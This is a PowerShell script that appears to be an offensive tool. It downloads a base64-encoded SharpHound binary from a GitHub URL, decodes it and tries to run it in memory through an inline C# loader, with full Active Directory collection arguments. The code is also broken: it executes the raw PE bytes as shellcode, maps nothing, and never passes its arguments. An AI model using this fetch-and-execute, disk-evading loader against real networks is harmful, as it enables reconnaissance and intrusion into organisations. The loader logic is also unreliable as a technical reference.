# Define the URL containing the base64 encoded string
$url = "https://raw.githubusercontent.com/MalwareLab49/SharpHound_Encoded/main/b64"

# Download the base64 encoded string from the URL
$base64String = Invoke-WebRequest -Uri $url -UseBasicParsing | Select-Object -ExpandProperty Content

# Decode the base64 string to a byte array
$exeBytes = [System.Convert]::FromBase64String($base64String)

# Define a function to load and run the executable in memory
function Invoke-ReflectivePE {
    param (
        [byte[]]$PEBytes,
        [string]$Arguments
    )

    # Allocate memory for the executable
    $mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
    [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $mem, $PEBytes.Length)

    # Check if the type PELoader already exists before adding it
    if (-not [System.Management.Automation.PSTypeName]::new('PELoader').Type) {
        $PELoader = @"
using System;
using System.Runtime.InteropServices;

public class PELoader
{
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate IntPtr GetProcAddressDelegate(IntPtr hModule, string procName);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate IntPtr LoadLibraryDelegate(string name);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate void RunPE();

    public static void Execute(IntPtr mem)
    {
        IntPtr pe = mem;
        IntPtr shellcode = mem; // Adjust this based on actual offset calculations

        RunPE run = (RunPE)Marshal.GetDelegateForFunctionPointer(shellcode, typeof(RunPE));
        run();
    }
}
"@
        Add-Type -TypeDefinition $PELoader -Language CSharp
    }

    [PELoader]::Execute($mem)

    # Free the allocated memory
    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($mem)
}

# Get the current working directory
$outputDirectory = (Get-Location).Path

# Define the arguments for SharpHound
$arguments = "-c All -o $outputDirectory"

# Invoke the reflective PE loader function with the decoded executable bytes and arguments
Invoke-ReflectivePE -PEBytes $exeBytes

Write-Host "Running SharpHound with arguments: $arguments"
